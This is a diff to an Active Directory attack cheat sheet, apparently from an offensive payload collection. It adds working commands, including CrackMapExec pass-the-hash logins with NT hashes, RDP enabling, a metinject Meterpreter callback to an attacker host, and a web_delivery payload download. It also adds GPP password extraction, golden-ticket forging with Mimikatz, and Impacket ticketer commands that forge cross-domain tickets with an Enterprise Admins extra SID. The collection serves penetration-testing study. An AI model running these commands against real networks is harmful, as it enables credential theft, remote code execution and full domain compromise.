@@ -15,6 +15,7 @@
   * [Pass-the-Hash](#pass-the-hash)
   * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+  * [Trust relationship between domains](#trust-relationship-between-domains)
 * [Privilege Escalation](#privilege-escalation)
   * [PrivEsc Local Admin - Token Impersonation (RottenPotato)](#privesc-local-admin---token-impersonation-rottenpotato)
   * [PrivEsc Local Admin - MS16-032](#privesc-local-admin---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
@@ -28,11 +29,23 @@
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
 * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+```powershell
+apt install bloodhound #kali
+neo4j console
+Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
+./bloodhound
+SharpHound.exe (from resources/Ingestor)
+or 
+Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+```
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 ```bash
 git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
+crackmapexec smb -L
+crackmapexec smb -M name_module -o VAR=DATA
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
+crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
 crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
 crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
@@ -93,6 +106,12 @@ Metasploit modules to enumerate shares and credentials
 scanner/smb/smb_enumshares
 windows/gather/enumshares
 windows/gather/credentials/gpp
+```
+
+Crackmapexec modules
+```powershell
+cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
+cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password
 ```
 
 List all GPO for a domain 
@@ -202,6 +221,7 @@ lsadump::dcsync /user:krbtgt
 lsadump::lsa /inject /name:krbtgt
 
 Forge a Golden ticket - Mimikatz
+kerberos::purge
 kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
 kerberos::tgt
 ```
@@ -228,6 +248,10 @@ misc::convert ccache ticket.kirbi
 
 Alternatively you can use ticketer from Impacket
 ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
+
+ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
+./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
+
 
 export KRB5CCNAME=/home/user/ticket.ccache
 cat $KRB5CCNAME
@@ -310,6 +334,18 @@ or
 ([adsisearcher]"(AdminCount=1)").findall()
 ```
 
+### Trust relationship between domains
+```powershell
+nltest /trusted_domains
+```
+or 
+```powershell
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+SourceName          TargetName                    TrustType      TrustDirection
+----------          ----------                    ---------      --------------
+domainA.local      domainB.local                  TreeRoot       Bidirectional
+```
 
 
 ## Privilege Escalation
@@ -358,7 +394,7 @@ net group "Domain Admins" hacker2 /add /domain
 ```
 
 
-## Thanks to
+## Documentation / Thanks to
  * [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
  * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
  * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
@@ -377,3 +413,11 @@ net group "Domain Admins" hacker2 /add /domain
  * [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
  * [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
  * [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
+ * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
+ * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
+ * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
+ * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
+ * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
+ * [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
+ * [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
+ * [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
